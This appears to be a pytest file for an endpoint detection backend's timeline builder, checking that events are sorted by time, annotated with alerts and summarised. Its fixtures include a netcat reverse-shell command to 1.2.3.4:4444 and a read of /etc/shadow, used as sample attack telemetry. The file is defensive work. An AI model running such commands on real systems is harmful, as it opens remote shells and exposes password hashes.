from types import SimpleNamespace

from edr_backend.correlation.timeline import build_timeline


def _alert(event_id, rule_id="r1", title="Reverse shell", severity="critical"):
    return SimpleNamespace(event_id=event_id, rule_id=rule_id, title=title, severity=severity)


PROC_EVENT = {
    "event_id": "e1",
    "time": "2026-07-08T10:00:05+00:00",
    "event_type": "process_create",
    "process": {"pid": 200, "name": "nc", "cmdline": "nc -e /bin/sh 1.2.3.4 4444"},
}

FILE_EVENT = {
    "event_id": "e2",
    "time": "2026-07-08T10:00:01+00:00",
    "event_type": "file_event",
    "file": {"path": "/etc/shadow", "action": "read"},
}

NET_EVENT = {
    "event_id": "e3",
    "time": "2026-07-08T10:00:09+00:00",
    "event_type": "network_connection",
    "network": {"process_name": "nc", "dst_ip": "1.2.3.4", "dst_port": 4444},
}


def test_entries_are_time_sorted():
    timeline = build_timeline([PROC_EVENT, FILE_EVENT, NET_EVENT], [])
    assert [e["event_id"] for e in timeline] == ["e2", "e1", "e3"]


def test_alerts_annotate_their_event():
    alerts = [_alert("e1"), _alert("e1", rule_id="r2", title="Shell from service")]
    timeline = build_timeline([PROC_EVENT, FILE_EVENT], alerts)

    by_id = {e["event_id"]: e for e in timeline}
    assert {a["rule_id"] for a in by_id["e1"]["alerts"]} == {"r1", "r2"}
    assert by_id["e2"]["alerts"] == []


def test_summaries_per_event_type():
    timeline = build_timeline([PROC_EVENT, FILE_EVENT, NET_EVENT], [])
    summaries = {e["event_id"]: e["summary"] for e in timeline}
    assert summaries["e1"] == "nc -e /bin/sh 1.2.3.4 4444"
    assert summaries["e2"] == "read /etc/shadow"
    assert summaries["e3"] == "nc -> 1.2.3.4:4444"
